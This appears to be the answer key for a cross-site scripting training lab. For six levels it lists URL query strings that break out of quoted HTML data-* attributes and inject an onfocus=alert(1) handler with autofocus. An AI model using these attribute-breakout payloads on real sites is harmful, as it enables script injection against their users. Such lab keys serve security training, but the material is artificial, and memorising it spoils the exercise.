# dataattr — solutions

Reflections inside HTML data-* attributes with single/double-quote contexts.

### dataattr-level1

`/data-attribute/level1/?query=%22%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: inside `data-value="..."` — break with `"` and add autofocus handler

### dataattr-level2

`/data-attribute/level2/?query=%27%20onfocus=alert(1)%20autofocus%20x=%27`

- payload: `' onfocus=alert(1) autofocus x='`
- context: inside single-quoted data-config JSON — break with `'`

### dataattr-level3

`/data-attribute/level3/?query=%22%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: inside `data-tooltip="..."` — break with `"`

### dataattr-level4

`/data-attribute/level4/?query=%22%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: inside `data-action="click->controller#..."` — break with `"`

### dataattr-level5

`/data-attribute/level5/?query=%27%20onfocus=alert(1)%20autofocus%20x=%27`

- payload: `' onfocus=alert(1) autofocus x='`
- context: inside `data-src='...'`, only `"` is encoded — single quote escapes

### dataattr-level6

`/data-attribute/level6/?query=%22%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: inside `<tr data-url="...">` — break with `"`
